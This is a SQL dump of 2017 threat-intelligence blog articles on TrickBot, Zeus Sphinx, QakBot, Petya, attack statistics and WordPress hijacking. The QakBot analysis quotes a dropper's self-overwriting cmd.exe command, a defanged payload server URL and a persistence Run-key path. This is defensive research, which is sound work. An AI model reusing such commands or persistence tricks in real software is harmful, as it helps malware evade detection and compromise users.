Incident Response Hotline at 1.888.241.9812 or 1.312.212.8034. This is a developing situation. As relevant information becomes available, we will post updates here, on the @IBMSecurity Twitter page and on  .', '\'Advanced Threats\', \'IBM Security\', \'IBM X-Force Exchange\', \'IBM X-Force Incident Response and Intelligence Services\', \'Malware\', \'Microsoft\', \'Microsoft Windows\', \'Petya\', \'Ransomware\', \'Server Message Block (SMB)\', \'WannaCry\', \'X-Force\'', 'https://securityintelligence.com/petya-werent-expecting-this-ransomware-takes-systems-hostage-across-the-globe/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (94, 'TrickBot Spreads to the Nordics, Launches Redirection Attacks in France', 'Limor Kessem', '2017-6-20', 'detected a new wave of TrickBot attacks targeting banks in Nordic countries. The malware expanded its configurations to launch fraud attacks against banks in Sweden, Finland, Norway, Denmark and Iceland, among the other geographies it targets. Moreover, the malware, which has been testing   on one bank in France, now targets 28 brands in the country, focusing on corporate, investment and private banking firms. The TrickBot banking Trojan’s operators have been working hard this year, employing sophisticated redirection attacks against banks across the globe. IBM X-Force data revealed that they also doubled their activity between the first two quarters of 2017, modifying the code to evade detection and launching infection campaigns in different parts of the world. Aside from the Nordics and France, TrickBot configurations target banks in 24 countries, including: Keep in mind, these numbers are for the current campaigns and will change over time. Configuration files are moving parts of any banking Trojan and can be modified rather frequently. TrickBot possesses a dedicated configuration to target banks in Australia, Canada, Germany and the U.S., to name a few. \n The fact that TrickBot spread into countries with distinctly different languages and banking systems suggests that its operators have the resources to research each target, have been preparing fake websites for the redirection attacks and most likely collaborate with actors based in the various countries the Trojan now targets. According to X-Force research, massive TrickBot campaigns detected in June 2017 have been leveraging the  , spreading the malware with the same tactics used by Dridex, Locky and Jaff: a   file containing an embedded Microsoft Office productivity file. The Office file, once opened, prompts the victim to  . The rest of the infection chain is quite similar to recent  : The user enables macros, malicious scripts launch PowerShell, and the payload is eventually fetched and deployed on the target endpoint. In the recent malware infection spam that comes through the Necurs botnet, X-Force researchers often noted that malware was layered into a number of different files and scripts before it actually infected the target endpoint. TrickBot is no different, and it comes wrapped up in a few layers. The infection chain starts when a user opens the PDF file. Users see a message on the screen requiring them to open another attachment, which can be a .doc or .xlsm file. If the user opts to open the second file, he or she is asked to enable macros. The macro contains a VBS script that launches as soon as the user enables the action. \n In the sample we analyzed, the PDF contained a weaponized Excel file with an embedded malicious macro. Once run, the script reaches out to a remote website and fetches the payload, which is a TrickBot’s dropper executable. The executable file arrives encoded and is decoded as soon as the download completes. In the following image, the script is exposed, showing the dropper payload being downloaded. Examining the communication logs, we can also see the script contacting the remote resource to fetch the dropper. \n Next, TrickBot downloads a module designed to check the target endpoint’s system specifics, encodes the data and saves that information to a file. The malware then checks for some machine parameters as part of its anti-testing environment protections and, once cleared, opens a malicious svchost.exe instance to fetch all other malware modules. If its requirements are not met, the malware crashes the svchost.exe instance it opened and does not proceed. \n Within the sample that downloaded an Excel file, the infection tree appeared as follows: \n In terms of their magnitude, X-Force research teams monitoring billions of spam emails a day found that over 3 million fraudulent messages containing TrickBot payloads were delivered to users between June 12, 2017 and June 14, 2017. The emails contained PDF files or, most recently,  , which allows Microsoft Windows Script Host users to work with a mix of scripting languages installed on their endpoints. Malware operators may change the types of file extensions they use to evade security tools that filter or flag specific file types in email messages. TrickBot emerged in August 2016 and launched into a testing and development period in what appears to be a banking Trojan project. This malware is a modular Trojan that appears to have some striking resemblance to the Dyre Trojan, both in its internal makeup and the infection methods it uses to reach new endpoints. The malware focuses on business accounts, especially various corporate banking services and investment banking. Its targets are employee emails and endpoints rather than indiscriminate spam spread to free webmail services. As  , the TrickBot Trojan is increasing its activity levels and has already joined the ranks of the top 10 most active malware families in 2017. According to X-Force data on banking Trojan activity, TrickBot now ranks seventh in the financial malware arena, accounting for about 4 percent of attacks. We expect to see the malware rise further this year due to its geographical expansion and increased activity in the second quarter of 2017. Indicators of compromise (IoCs) and information on TrickBot are updated in the   on the X-Force Exchange.', '\'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'TrickBot\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/trickbot-spreads-to-the-nordics-launches-redirection-attacks-in-france/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (95, 'Zeus Sphinx Pushes Empty Configuration Files — What Has the Sphinx Got Cooking?', 'Limor Kessem', '2017-6-15', 'Lately,   has seen the Zeus Sphinx Trojan go through a targetless phase, an exceedingly rare occurrence in the cybercrime arena. Recent Zeus Sphinx samples have fetched configuration files in which all the target URLs were removed. This means that while Sphinx infection campaigns continue and the malware can infect new machines, it remains idle and lacks attack instructions to target specific banks and banking services. The only instruction that repeats in all Sphinx configuration is to inject a victim’s “bot ID” into every page he or she visits. In essence, this is a webinjection attack: Inject into http*://*, covering any HTTP and HTTPS webpage the victim browses to. \n This phase of empty Sphinx configuration files started in March 2017 and increased over the past few months to include all Sphinx samples. This suggests that Sphinx is presently operated by one group, not multiple actors, despite the fact that it was commercially sold in the underground when it was launched in 2015. What are Sphinx’s operators cooking up? In 2017, the malware was   in a number of countries, mostly focusing on Australia, the U.S. and Canada. Throughout that time, and to date, Sphinx’s operators have launched different infection campaigns to spread the malware to more users. According to X-Force research, one of the most interesting phases came in late January 2017, when Sphinx was being delivered by a well-known spam source called  . This network was one of the more prominent distributors of the  , serving spam for cybercriminal customers. A notable change came in the week of Jan. 19 to Jan. 24, 2017, when Neverquest delivery via Moskalvzapoe suddenly halted. After that week, Moskalvzapoe got right back into serving banking Trojans, only this time it was spreading Zeus Sphinx, dropping it via Moskalvzapoe’s DELoader, also known as  . Neverquest has since completely died down, dropping from the second most prevalent financial malware families into oblivion. Zeus Sphinx, on the other hand, has been climbing up the chart ever since, placing fifth in June, right under seasoned organized cybercrime gangs such as Gozi, Ramnit and Dridex, per X-Force data. \n Did the Neverquest gang take over Sphinx   of one of its members? What is the purpose of injecting a bot ID into each page visited by infected users? Are the Sphinx operators planning to set up the botnet for monetization, similar to how Neverquest used to rent botnet sections to the cybercrime elite? These questions will likely remain unanswered until the next change takes place. And while the botnet continues to amass new infections, at least banking customers are getting a break for the time being. At this time, Sphinx does not have defined targets, but X-Force data revealed that recent campaigns have affected users in North America, the U.K. and Australia. It is possible that Sphinx’s operators are preparing new targets, sectioning the botnet or partnering with other groups, and will go back to targeting the banking sector in the coming weeks. Zeus Sphinx   in 2015, when it was up for sale in the Russian-speaking underground by a vendor who apparently picked up the Zeus v2 source code and commercialized it. The first Sphinx attacks were configured to target PayPal,   and a bank in Poland using elaborate webinjections to trick victims into authorizing fraudulent transactions. The malware, which was most likely operated by different actors, started popping up in other geographies, most notably Brazil and Colombia, in the summer of 2016. At the time, Sphinx was adapted to the   with more than just local targets, also adding Boleto payment manipulation to the mix. Boleto payments are very popular in Brazil — they are similar to the money order concept in the U.S. — and Sphinx featured a module that automatically rerouted these payments to its operators. X-Force data revealed that by January 2017, the malware started targeting banks in Canada and Australia, increasing its activity in the surrounding areas, particularly New Zealand and the U.S. In March, Sphinx saw all URL targets removed from some configurations, eventually affecting all Sphinx configurations fetched by infected bots in the second quarter of 2017. Below are sample indicators of compromise (IoCs) used in this report:', '\'Banking Trojan\', \'Financial Malware\', \'IBM X-Force Research\', \'Neverquest\', \'Sphinx\', \'Trojan\', \'Webinjection\', \'X-Force\', \'Zeus\', \'Zeus Sphinx\'', 'https://securityintelligence.com/zeus-sphinx-pushes-empty-configuration-files-what-has-the-sphinx-got-cooking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (96, '10 Ways to Fight Advanced Malware With Threat Intelligence Sharing', 'Christian Falco', '2017-6-12', 'Last month, we celebrated the   of the IBM X-Force Exchange (XFE). During that week, the threat intelligence sharing platform reached a record spike in traffic as users flocked to the site to stay up to date on the recently exposed WannaCry ransomware. As the X-Force team populated the  , it quickly became the highest-rated and most-followed collection in XFE history. With the wind behind our sails, it seems like the perfect time to share some of the platform’s top tips and tricks that even our 35,000 registered users might not know about. Many organizations struggle to keep pace with the various versions of malware out in the wild, let alone the increasingly sophisticated tactics of their operators. It’s crucial to remain vigilant using the existing security systems and awareness programs you have in place to prevent malware from infecting your endpoints and network. This is a never-ending battle that requires you to push your vendors and staff to think differently about access and data protection. It’s also important to constantly assess the cybercrime landscape to stay one step ahead of threat actors’ evolving tactics. As Barkley pointed out in its “ ,” today’s malware commonly infects victims directly via “clickless” methods and by abusing or exploiting legitimate systems. With curated threat intelligence, collections help streamline security investigations with information on campaigns, actors, and tactics, techniques and procedures (TTPs), and provide actionable recommendations from the X-Force research community. While you can manually build a collection in the platform, you can save time by  . To auto-build your collection, navigate to   >  , obtain your X-Force email address, and send an email to it. In light of the WannaCry ransomware attack, which reached thousands of companies across more than 100 countries, sharing threat intelligence outside your enterprise quickly is just as important as collaborating in your own security operations center (SOC). X-Force Exchange allows security teams to share pertinent threat intelligence on Twitter, Facebook and LinkedIn with just a click of the mouse. Look for the icons in all public collections. The   delivers programmatic access to nearly 800 TB of threat intelligence data across IPs, URLs, vulnerabilities, malware and more. With the API, users can access XFE data from collections, obtain up-to-date information on indicators and integrate with other products to perform real-time actions. As a registered user, go to   >   to generate your API key, and test its functionality within the interactive  . If nearly a petabyte of threat data isn’t enough, X-Force Exchange has enabled integrations with   to expand threat intelligence through its Threat Feed Manager. With more curated knowledge, you can make better decisions even faster when it comes to your security investigation. Go to   >   to expand your threat intelligence. Keep up with   on selected platforms with our Watchlist feature. Go to   >   to choose your specific enterprise technologies and receive alerts as soon as vulnerabilities are released, complete with pertinent information such as Common Vulnerability Scoring System (CVSS) scores, impacted product lists and references. IBM X-Force Exchange enables notifications beyond just vulnerabilities. For a full menu of alerts on threat intelligence included in Advisories, Collections, Groups and Reports, go to   >  . Select and deselect as you see fit to help augment your research workflow and sift through the noise. Want the botnet distribution card front and center? Don’t really care about groups? On the new dashboard, customize your layout with the gear icon. Promote, demote and drop cards as you wish depending on what helps you better research and investigate threats. Within each collection, there is a voting feature that allows you to like or dislike a specific collection. Bring awareness to the community with your opinion on the collected threat intelligence, and see the latest and greatest intelligence by going to the Public Collections menu and filtering by date and rating. XFE has global researchers dedicated to finding, curating and sharing actionable threat intelligence across more than 38 billion web pages, 860,000 IPs and 113,000 vulnerabilities. If you are curious about the source of any given collection, check the version history. IBM X-Force researchers have a blue shield next to their profile image. To explore more ways in which threat intelligence sharing can help your organization fight advanced attacks such as WannaCry, register for the free  .', '\'Advanced Threats\', \'IBM X-Force Exchange\', \'Malware\', \'Threat Intelligence\', \'Threat Sharing\', \'X-Force\'', 'https://securityintelligence.com/10-ways-to-fight-advanced-malware-with-threat-intelligence-sharing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (97, 'Manufacturing Security Incidents: Forty Percent Higher Than Cross-Industry Average in 2016', 'Michelle Alvarez', '2017-6-6', 'The   — including, but not limited to, automotive, electronics, food and beverage, textile and pharmaceutical companies — was the third most attacked sector in 2016, according to the  . In fact, the number of security incidents, which are attacks or security events reviewed by IBM security analysts and deemed worthy of deeper investigation, was almost 40 percent higher than the average across all industries. \n The top attack vector targeting manufacturing clients monitored by X-Force in 2016 was attacks incorporating malicious input data such as SQL or command injection. This vector accounted for 74 percent of the attacks, which was notably higher than the cross-industry average of 42 percent. It’s not surprising, then, that there are considerably more outside threats than   targeted the manufacturing sector — 91 percent outsiders to 9 percent insiders. The outsiders could include well-funded fraudsters, organized crime groups and nation-state actors. This view of the manufacturing security landscape, however, differs from the one generated from  . Very few manufacturing sector incidents were revealed in 2016. This led IBM X-Force researchers to suspect some underreporting, perhaps because manufacturing is not as tightly regulated as industries such as financial services, health care and retail. However, the   from one of the world’s largest steelmakers is evidence that the threat to manufacturers’ intellectual property and operating information — this industry’s crown jewels — is very real. A new IBM research paper focuses on the top attacks detected against the manufacturing sector. Since the No. 1 manufacturing security threat involved the use of malicious input data,   and data input sanitization are essential. We recommend reviewing the report for other best practice guidelines.', '\'IBM X-Force Research\', \'Industry\', \'Insider Threat\', \'Manufacturing Industry\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/manufacturing-security-incidents-forty-percent-higher-than-cross-industry-average-in-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (98, 'QakBot Banking Trojan Causes Massive Active Directory Lockouts', 'Mike Oppenheim', '2017-6-2', 'IBM X-Force Research recently observed a wave of malware-induced Active Directory (AD) lockouts across several incident response engagements. The lockouts caused hundreds to thousands of AD users to get locked out of their company’s domain in rapid succession, leaving employees of the impacted organizations unable to access their endpoints, company servers and networked assets. Active Directory manages users and user access on Microsoft servers, as well as the policies and procedures that enable network access. X-Force researchers associated the mass AD lockouts with malicious activity by an existing banking Trojan known as QakBot, aka PinkSlip. X-Force Incident Response and Intelligence Services (IRIS) responders, who investigated recent QakBot activity waves, suspect that numerous organizations have suffered and will continue to suffer from these lockout waves. According to X-Force research, QakBot is financial malware known to target businesses to drain their online banking accounts. The malware features   to self-replicate through shared drives and removable media. It uses powerful information-stealing features to spy on users’ banking activity and eventually defraud them of large sums of money. Though well-known and familiar from previous online fraud attacks, QakBot continually evolves. This is the first time IBM X-Force has seen the malware cause AD lockouts in affected organizational networks. Although part of QakBot is known to be a worm, it is a banking Trojan in every other sense. QakBot is modular, multithread malware whose various components implement online banking credential theft, a backdoor feature, SOCKS proxy, extensive anti-research capabilities and the ability to subvert antivirus (AV) tools. Aside from its evasion techniques, given admin privileges, QakBot’s current variant can disable security software running on the endpoint. Overall, QakBot’s detection circumvention mechanisms are less common than those used by other malware of its class. Upon infecting a new endpoint, the malware uses rapid mutation to keep AV systems guessing. It makes minor changes to the malware file to modify it and, in other cases, recompiles the entire code to make it appear unrecognizable. \n Much like other malware of its class, the QakBot Trojan is ushered into infected endpoints through a dropper. The dropper typically uses delayed execution to evade detection. It lands on the target endpoint and halts before any further action for 10 to 15 minutes, hoping to elude sandboxes that might try to analyze it upon arrival. Next, the dropper opens an explorer.exe instance and injects the QakBot Dynamic Link Libraries (DLL) into that process. After deployment, the dropper corrupts its original file. It uses the ping.exe utility to invoke a ping command that will repeat six times in a loop: C:\\Windows\\System32\\cmd.exe” /c ping.exe -n 6 127.0.0.1 & type “C:\\Windows\\System32\\autoconv.exe” à “C:\\Users\\UserName\\Desktop\\7a172.exe When the pings are complete, the contents of the original QakBot dropper are overwritten by the legitimate Windows autoconv.exe command. (Autoconv.exe converts file allocation table (FAT) and FAT32 volumes to the NTFS file system, leaving existing files and directories intact at startup after Autochk runs.) A snippet of QakBot’s JavaScript downloader is shown below: \n In the example above, the download locations that would fetch the QakBot payload were lightly obfuscated using character codes. The downloader from this sample attempted to connect to the following three update servers: At the time we ran the sample, the following download server responded with a large amount of ASCII hex, which was the QakBot payload: projects[.]montgomerytech[.]com/TealeafTarget.php. Shortly after the payload was received on the infected machine, randomly named copies of QakBot were deployed to the system, as was the legitimate autoconv.exe utility. To communicate with infected machines via rendezvous domains created on the fly, QakBot uses both a   and a list of hardcoded command-and-control (C&C) servers. The hardcoded C&C servers observed in our sample are included at bottom of this article. QakBot is notorious for its capability to persist on infected machines. This, combined with the malware’s AD lockout capabilities, makes it especially frustrating to detect and remove in enterprise environments. To keep itself alive after system reboots and removal attempts, QakBot establishes persistence mechanisms on the target systems using a Registry runkey and scheduled tasks. It creates a “\\CurrentVersion\\Run” registry entry to automatically launch itself after each new run of the operating system. An example run key created by the malware was “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xyhz,” which pointed to “C:\\Users\\UserName\\AppData\\Roaming\\Microsoft\\Graroaojr\\graroaoj.exe.” QakBot adds another layer of persistence and creates recurring, named, scheduled tasks via “schtasks.exe” to run itself on timed intervals and ensure that it has not been disabled or removed. \n QakBot typically creates two named scheduled tasks. The first scheduled task periodically launches QakBot: The second scheduled task launches a separate JavaScript based downloader with a .wpl extension: While observing QakBot’s effect on the Active Directory domain, X-Force researchers witnessed the malware performing the following three activities: To spread through the affected network, QakBot can move laterally, both automatically and on demand, by a remote command from its C&C server. To activate that capability, the attacker launches the malware’s command “13,” also known as “nbscan” in earlier variants of QakBot. To access and infect other machines in the network, the malware uses the credentials of the affected user and a combination of the same user’s login and domain credentials, if they can be obtained from the domain controller (DC). QakBot may collect the username of the infected machine and use it to attempt to log in to other machines in the domain. If the malware fails to enumerate usernames from the domain controller and the target machine, the malware will use a list of hardcoded usernames instead. \n To authenticate itself to the network, the malware will attempt to match usernames with various passwords. We have observed three password schemes, which may serve to defeat  : \n Below is the assembly of a stack frame to attempt a connection to the IPC$ administrative share of a target machine using a username obtained from a domain controller: \n IPC$ is part of the common hidden network shares that are accessible only to administrators. Attackers may use it in conjunction with administrator-level credentials to remotely access a networked system over server message block (SMB). Usually, the purpose is to interact with systems using remote procedure calls, transfer files and run transferred binaries through remote execution, which could help QakBot run its malicious code. Once the malware successfully connects to the IPC$ administrative share of the target machine, it checks to determine whether it can create a service locally. If it can, QakBot proceeds to enumerate the network shares of the target machine and then attempts to drop a copy of itself to one of the shares. Once a copy of the malware is dropped, the malware creates and starts a service in the target machine to execute it. Under certain domain configurations, the malware’s dictionary attack for accessing the target machines can result in multiple failed authentication attempts, which eventually trigger an account lockout. QakBot’s main purpose is to take over the bank accounts of a business, and possibly those of infected employees who browse their online banking at work. QakBot implements   functionality that allows injected malicious code to be inserted into online banking sessions. Instead of keeping them inside its configuration file, QakBot fetches these malicious scripts on the fly from the domain it controls, in the following format: These scripts are commonly referred to as webinjections because they are used to manipulate the visual content that infected users see on their banking websites. The code snippet below, labeled “WIRE” by the author, appears to check whether “To enroll in the” is visible on the wire transfer page of the targeted bank. This is very typical Trojan behavior, designed to figure out where to start inserting the malicious code to modify the page and match the fraud M.O. the attacker has planned. It’s easy to see in this example that QakBot is targeting corporate banking services and aiming to reach the “change address” page of the compromised account. \n Another snippet from the same webinjection script seeks to collect personal information displayed in the online banking session by querying the document object model (DOM) elements of the page with names that are known to house sensitive details, such as date of birth and Social Security number. \n The malware’s operators typically use QakBot to piggyback on banking sessions initiated by the user. QakBot’s theft mechanisms allow it to steal information including: Other data typically exfiltrated by QakBot and sent to a criminal-controlled FTP server include: QakBot propagation in the wild most often takes place via exploit kits (EKs) and spam campaigns that target employees rather than widespread webmail users. Once inside the network, QakBot acts as a worm that can spread through network shares and removable drives. In terms of magnitude, researchers reported that a recent QakBot botnet had   over 54,000 infected computers. Discovered in the wild in 2009, QakBot is historically considered one of the most advanced banking Trojans active in the wild. It is also the first Trojan that was designed to exclusively target the business banking sector, a vocation to which it has kept true throughout the past eight years. In current QakBot campaigns, the malware is focused on U.S. business banking services, including treasury, corporate banking and commercial banking. X-Force IRIS responders have seen QakBot attacks in the pharmaceutical and technology sectors. \n According to X-Force researchers, QakBot’s operators have been upgrading the malware’s code, persistence mechanisms, anti-AV and anti-research capabilities. As the malware evolves, it has also been known to target organizations in the health care and education sectors. Researchers believe that a closed, organized cybercrime gang with roots in Eastern Europe is responsible for QakBot. From a global perspective, QakBot’s focus on the business sector and its periods of inactivity leave it at the bottom of the top 10 list of the most active malware families. In the past five years, the group operating QakBot has been in and out of the cybercrime arena, likely in an attempt to keep attacks to a minimum and avoid law enforcement attention. \n To detect threats such as QakBot, banks and service providers should use adaptive   that provide real-time insight into fraudster techniques and address the relentless evolution of the threat landscape. Keeping QakBot out of employee endpoints starts with cybersecurity awareness, since this malware may come through infected websites or via email attachments. Users can protect themselves and their organizations by practicing browsing hygiene, disabling online ads, filtering macro execution in files that come via email and observing other  . Security basics go a long way toward protecting against EK deliveries. It’s critical to keep all operating systems   across the organization, update frequently used programs and delete those no longer in use. To mitigate QakBot activity on the network, make sure domain accounts are configured with the least privilege required to perform job tasks. Organizations can also create a random domain admin account for safety purposes and ensure that it reports directly to the security information and event management (SIEM) system upon any attempt to use it. A special emergency account can enable security staff to recover service and determine the source when network users are being locked out. Finally, prevent workstation-to-workstation communications where possible to force malware out of the trenches and into areas where central detection systems will pick it up quickly. Malware dropper MD5: Malware sample MD5: QakBot’s hardcoded C2 servers:', '\'Banking Malware\', \'Banking Security\', \'Banking Trojan\', \'Financial Industry\', \'Financial Malware\', \'IBM X-Force Incident Response and Intelligence Services\', \'IBM X-Force Research\', \'Malware\', \'Online Banking\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/qakbot-banking-trojan-causes-massive-active-directory-lockouts/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (99, 'Mark Your Calendar: IBM X-Force Tracks Cyberattacks by Month', 'Michelle Alvarez', '2017-6-2', 'The   is a great overview of 2016’s threat landscape. With risk management in mind, we decided to take a deeper look at which months were most active in terms of vulnerability disclosures, cyberattacks, spam volume, financial malware infections and publicly disclosed security incidents. Interestingly, we found a trend among the different vectors where, in the later part of the year, and particularly in December, we saw an influx of criminal activity. Should these findings play a role in how enterprises address security pain points? Or is it just fun to analyze the data and make speculations, knowing that a robust   with solutions in place to address cyberthreats all year long is most important? Perhaps it is a combination of both. The X-Force vulnerability database has been tracking public disclosures of software vulnerabilities since 1997. In 2016, the 20th year of documenting these threats, X-Force recorded the highest single year number in its history:  . October was the most active month for disclosures in 2016, as tracked by X-Force, with nearly 11 percent of vulnerabilities reported. The month of October actually appears repeatedly in the top two spots in terms of vulnerability disclosures over the last five years. In fact, of the total number of vulnerability disclosures for 2012 through 2016, October tops the chart with 11 percent of disclosures. \n \n It’s no surprise, then, that the fourth quarter of 2016 revealed the highest number of disclosures for the year. In each of the past three years, vulnerability disclosures have ramped up during Q4, with 28 percent reported during these last three months of each calendar year. So what’s behind this surge in disclosures toward the end of the year, especially in October? Do vulnerability researchers have a sales quota of sorts to meet? Are they trying to uncover as many vulnerabilities as they can before the holidays? It’s a curious trend that may be in for a shake up in 2017. As of mid-May, there have already been 5,233 vulnerabilities disclosed, more half of the total for our record year, and we’re not even halfway through 2017. To put it in a different perspective, the X-Force vulnerability database revealed that Q1 2017 holds the record over the past five years for most vulnerabilities reported in the first quarter by nearly 53 percent. Are attackers and researchers working harder? Perhaps. However, it’s more likely a testament to the proliferation of applications, operating systems and devices, which is contributing to the growing number of vulnerabilities. Upon analyzing data from security clients, X-Force found that attackers are quite active and target more systems toward the end of the year. December saw the largest number of attacks in each of the last two years, making up 19 percent of the total number of attacks. \n \n IBM X-Force defines a cyberattack as a security event that has been identified by correlation and analytics tools as malicious activity that attempts to collect, disrupt, deny, degrade or destroy information system resources, or the information itself. In other words, cyberattacks are committed by bad guys attempting to act against your network and other enterprise assets by conducting command injection, manipulating data structures, inputting data or system resources, subverting access controls to gain privileges or committing other nefarious acts. Is it fair to speculate that if there is a spike in vulnerability disclosures in October, as we witnessed, we would therefore see a rise in attack activity following in December? Maybe. However, we know that attackers often exploit tried-and-true  , not necessarily the latest vulnerability. Monitoring clients is just one way the X-Force team gauges the threat landscape. Does the end-of-the-year assault trend continue when we assess other sources? It sure does, at least with spam campaigns. X-Force runs spam traps around the world, and monitors more than 8 million spam and phishing attacks daily. For the past two years, the most popular month for spam was December, making up 12 percent of total percentage of spam observed. This is likely the result of a barrage of   launched during the month to take advantage of the season. \n \n For another interesting statistic, the highest volume of spam — 20.6 percent — hit on Wednesdays during 2016, with Thursdays following close behind at 19.6 percent. The lowest spam volume occurred over the weekends, with 6.5 percent and 3.9 percent of spam striking on Saturdays and Sundays, respectively. \n \n This midweek ramp up is no surprise, since attackers want to increase their success rates by reaching the victims when they are most often online and ready to be lured into phishing and other nefarious schemes. When it comes to financial malware infections, it’s almost too close to call, with March seeing only a hair more infections (.1 percent) than December in 2016. Suffice to say that this end-of-the-year criminal activity streak extends to the financial malware vector. Analysis of data collected from IBM Security’s antifraud protection product,  , revealed that the months of March and December saw the highest numbers of financial malware infections, with 10.6 percent and 10.5 percent, respectively. \n \n We’re not surprised to see December top the charts for most infections. We witnessed the onslaught of the Trickbot Trojan spreading its “joy” during the holiday season to   and  . Cybercriminals typically ramp up their infection campaigns during the holiday season to jump into the already busy period for financial and e-commerce entities. According to   data, another hair separates the two months at the top of the list of the most publicly disclosed incidents reported. With 11.42 percent and 11.11 percent, respectively, February and March saw the most publicly disclosed incidents reported in 2016. \n \n Allow me to speculate here: The data we analyze from monitored clients, spam traps and malware infections is a strong indication of what is happening outside this giant telescope we possess. It stands to reason, then, that many organizations that publicly report their incidents are experiencing many attacks and compromises during the same time frame. If there’s an elevated number of attacks in December, then it’s plausible we would see an increase in reports of compromise a few months later — say, during February and March. This time lapse makes sense in light of the median time to discover a data breach, which has dropped from 416 days in 2012 to 146 days in 2015. December is a notoriously lucrative time for attackers seeking to take advantage of increased online activity followed by reduced staff later in the month. A new, unpatched vulnerability that surfaces right before everyone goes on holiday might end up making you  , but this is clearly not the time to be lax about  . Take note of the word “most,” used throughout the blog as an adverb and adjective rather than “all.” That is because cyberattacks, including network attacks, spam, phishing, malware campaigns and the like, occur throughout the year. Enterprises shouldn’t base their security strategies around the time of year. Instead, they should focus on building a holistic and integrated security immune system to protect against cyberthreats all year.', 'None', 'https://securityintelligence.com/mark-your-calendar-ibm-x-force-tracks-cyberattacks-by-month/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (100, 'Relying on Data to Mitigate the Risk of WordPress Website Hijacking', 'Mark Usher', '2017-5-30', 'One of the most common methods cybercriminals use to deliver phishing and malware to unsuspecting users is compromising legitimate websites, such as those hosted on WordPress, to house their own malicious content for free. The URLs of compromised sites used for phishing attacks reach users through spam emails, allowing security professionals to keep track of their volume. In 2016, according to an  , phishing attack campaigns shattered all previous years’ records, which the firm began monitoring in 2004. The report revealed that phishing sites peaked at 158,988 in the month of April 2016, a large number of attacks that keeps growing year over year. Once hijacked, the same site can be used to serve malware. There are ways to protect users from email-borne attacks, but to keep the internet safer from those who perpetrate them, we must cut the supply chain even earlier. On the vendor side,   can ensure that affected sites are flagged on time to prevent users from reaching them, thus foiling the attacker’s plans. On the website side, administrators should prioritize applying basic security practices to keep their sites safer, and users should remain cautious about opening unsolicited email and accessing links or attachments they receive inside. \n When it comes to the lucrative platforms, cybercriminals usually opt for those that cover more ground. That is why the Windows operating system is a primary mark for malware, and the Android OS is targeted by over  . Following that same logic, the WordPress (WP) platform is one of the most popular content management systems (CMS) on the internet, holding close to  . Therefore, it is often targeted by fraudsters. The platform is free to use, open source, and based on PHP and MySQL. WordPress is installed on a web server and can be used as part of a hosting service or directly on a network host, which makes it the choice of many website builders. The sheer quantity of WordPress-based sites makes them natural targets for spammers and cybercriminals who compromise legitimate websites to freely host their own malicious content. And since so many sites are based on the same code, finding just one vulnerability can mean  , a practice that black-hat hackers apply to any type of platform. To maintain the platform’s security in the face of such threats, the WP community has been actively updating the code base to keep both users and websites safe. Since its first release in May 2003, there have been  , many of which addressed  . The most recent security update, v4.7.3, was released on March 6, 2017, adding further fixes and security to the existing distribution. But our data shows that website builders are slow to update, which can increase the site’s exposure to  . IBM X-Force used data from its web crawlers to log different websites with an indication of which code version they were using. Our data showed that many of the dated WP versions are still in widespread use. To minimize the number of websites running older versions of the platform, WordPress introduced   in October 2013 as it released version 3.7. Although users can still control the update configuration in those instances, the WP default is to install all minor core updates automatically. With automatic updates, one could expect to see more uniformity across the version distribution, but the data shows that the spectrum of version numbers is still wide. This can mean that some admins have disabled the automatic update feature, even though automating updates is a known security best practice. The reason this happens is usually convenience. When updates take place without direct action from the administrator, unexpected and unsupervised processes may crash the application or affect part of its functionality, resulting in a great deal of work to adapt the application to a new source code or framework version. Custom plugins and themes also lead admins to turn off automatic updates. Updates could reset the custom code and, as a result, affect the look and feel of the website. In this respect, most admins would put customer experience before automating security. Let’s take, for example, WordPress v4.7.2, which fixes three vulnerabilities that could be used to   running that version. X-Force found that more than 5 percent of WordPress sites still run the vulnerable version 4.7 or 4.7.1, and fraudsters indeed   of this weakness to inject their own content into those legitimate but compromised websites. Let’s look at a few examples to gain a wider sense of what attackers are doing to compromise sites. In our ongoing analysis of the spam trends, X-Force Research has been observing a long-running spam campaign that takes advantage of   to host foreign content on the affected systems. The hack is notable because the spammers seem to make only minimal changes to the target systems and enjoy abusing them at no cost. In general terms, to get themselves a free ride on someone else’s website, attackers compromise the site using one of the vulnerabilities that applies to the WP version it runs. Then, a small HTML or PHP file is inserted into a subdirectory of the WordPress system. In over 70 percent of the URLs we analyzed, this folder was “wp-content,” but other directories such as “wp-includes” and “wp-admin” were also used. Often, the malicious file is inserted into one of the   or theme subdirectories. These are notoriously vulnerable because plugins and themes are programmed by third parties. Since WordPress is an open source platform, these can essentially be distributed by both security-aware developers and those without secure coding experience, not to mention malicious actors. The WP core does evolve, and more secure application program interfaces (APIs) and functions are introduced into it over time. But plugins can sometimes keep using old or deprecated functions, which carry vulnerabilities into the newer versions admins use. The following chart shows the distribution of WordPress folders in which malicious files were most often inserted. The content folder is where plugins and themes are kept, which is likely why close to 70 percent of the URLs used “wp-content” as the starting point of the attacker’s plan. \n Let’s drill down a tad. For the URLs that use “wp-content,” the top three most-used subdirectories under “wp-content” are “plugins,” “themes” and “uploads.” \n X-Force data revealed that nearly 40 percent of the URLs using the WP “plugins” directory reference a PHP or HTML page placed directly into that directory. The remaining 60 percent target an existing plugin subdirectory. The most frequent, with 14 percent, is the “mailit” plugin, although we have observed over 1,000 different WP plugins being targeted by attackers in their various campaigns. \n Plugins are indeed vulnerable elements of the WordPress CMS and make for popular insertion points for malcode, and the story is similar with theme directories. X-Force data showed that over 45 percent of the URLs using that directory reference a PHP page placed directly into the directory. The remaining URLs used existing theme subdirectories. 